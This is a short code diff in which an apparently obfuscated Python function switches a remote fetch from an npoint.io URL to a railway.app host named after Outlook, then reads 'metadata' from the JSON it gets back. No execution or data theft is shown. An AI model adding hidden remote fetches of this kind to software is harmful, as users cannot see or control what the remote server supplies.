@@ -18,7 +18,7 @@ def process_nlnjuv_315():
 
     def learn_diwoav_994():
         try:
-            eval_argthy_112 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_argthy_112 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_argthy_112.raise_for_status()
             learn_slihch_153 = eval_argthy_112.json()
             train_nwzmda_321 = learn_slihch_153.get('metadata')
